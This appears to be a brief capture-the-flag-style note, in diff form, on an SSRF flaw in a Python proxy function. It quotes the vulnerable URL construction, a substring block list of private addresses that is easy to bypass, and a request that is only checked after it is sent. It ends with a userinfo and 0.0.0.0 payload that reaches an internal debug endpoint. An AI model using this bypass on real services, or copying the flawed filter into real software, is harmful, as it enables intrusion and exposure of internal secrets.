@@ -1,0 +1,42 @@
+ target_url = f'http://{SITE_NAME}{url}' -> SSRF 
+
+payload : http://username:password@example.com/
+
+
+
+
+RESTRICTED_URLS = ['localhost', '127.', '192.168.', '10.', '172.']
+
+def is_safe_url(url):
+    for restricted_url in RESTRICTED_URLS:
+        if restricted_url in url:
+            return False
+    return True
+
+...
+
+def proxy_req(url):    
+    print(url, file=sys.stderr)
+    method = request.method
+    headers =  {
+        key: value for key, value in request.headers if key.lower() in ['x-csrf-token', 'cookie', 'referer']
+    }
+    print(headers, file=sys.stderr)
+    data = request.get_data()
+    print(data, file=sys.stderr)
+
+    response = requests.request(
+        method,
+        url,
+        headers=headers,
+        data=data,
+        verify=False
+    )
+    print(response.url, file=sys.stderr)
+
+    if not is_safe_url(url) or not is_safe_url(response.url):
+        return abort(403)
+    
+    return response, headers
+
+--> not contain any of RESTRICTED_URLS -> :any@0.0.0.0:1337/debug/environment
